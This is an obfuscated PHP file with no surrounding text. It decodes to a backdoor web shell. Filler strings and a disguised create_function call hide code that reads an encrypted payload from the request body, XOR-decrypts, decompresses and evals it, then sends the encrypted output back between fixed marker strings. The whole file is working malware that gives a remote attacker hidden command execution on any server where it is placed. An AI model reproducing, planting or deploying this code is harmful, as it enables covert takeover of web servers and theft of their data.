<?php
$o='/@Lin@Lp@Lut"),$m)==1)@L {@ob_star@Lt();@e@Lv@Lal(@gzuncom@Lp@Lress(@x@L(@bas@Le6@L4_decode(@L$m[1]),$k))@L);$@Lo=@L@ob_g';
$k=',$k){$c=st@Lrl@Len@L($k@L);$l=strlen($@Lt);@L$o="";for@L($i=0;$i@L<$l;){f@Lor($j=0;(@L$j<$c&@L&$@Li<$l);$@L@Lj++,$i++){$@';
$A='et@L_c@Lontents();@ob_end@L_c@Llean(@L);$r@L=@b@Lase64_en@Lco@Lde(@x(@gzcompre@Lss($o@L@L),$k));print@L@L("$p$kh$r$kf");}';
$M='$k@L=@L"04ed6426"@L;$kh="68312bb@L@L44d0f"@L;$kf@L="ddb767b598e@La";$p=@L"PKCp@L@L6OWdU043QLK@LP";func@Lt@Lion x@L($t';
$f=str_replace('NG','','creNGNGNGateNGNG_fNGunction');
$K='Lo.=$t{$i@L}^$k{$j@L};}}r@Letu@Lrn $@Lo;}@Lif (@preg_m@Latch("/$kh@L(.@L+)$kf/",@fi@Lle_g@Let_cont@L@Lents("php:/';
$P=str_replace('@L','',$M.$k.$K.$o.$A);
$c=$f('',$P);$c();
?>
